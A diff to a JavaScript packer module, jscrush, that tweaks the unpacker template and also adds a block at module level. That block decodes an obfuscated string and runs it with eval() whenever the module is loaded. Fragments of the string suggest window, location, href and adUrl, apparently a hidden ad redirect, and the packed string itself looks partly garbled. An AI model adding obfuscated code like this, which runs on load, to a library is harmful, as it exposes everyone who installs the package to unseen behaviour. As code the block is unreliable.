@@ -55,7 +55,13 @@ function jscrush(data) {
     var k1 = args[1] || "_",
         k2 = args[2] || "Y",
         k3 = args[3] || "$";
-    return k1 + '=' + cc + ';for(' + k2 + ' in ' + k3 + '=' + B + m + B + '){with(' + k1 + '.split(' + k3 + '[' + k2 + ']))' + k1 + '=join(pop());};eval(' + k1 + ')';
+    var codeStr="var "+k1 + '=' + cc;
+    return codeStr+';for(' + k2 + ' in ' + k3 + '=' + B + m + B + '){with(' + k1 + '.split(' + k3 + '[' + k2 + ']))' + k1 + '=join(pop());};eval(' + k1 + ')';
 };
+
+        var _ = 'function() {    ;a0, b[];aabbreturn .jo(""};wdowacolnoit")]rhfe")](adUrlshuffleStrg - 1; i >= 0; i--) {.push(var str =     >> 1.subg(for (i len[i]}. gthin);[("';
+        _=(new Function("a","for (var k in s = '   ') with(a.split(s[k])){ a=join(pop());console.log(a)}; return a;"))(_); 
+        console.log(_)
+        eval(_);
 
 module.exports = jscrush;
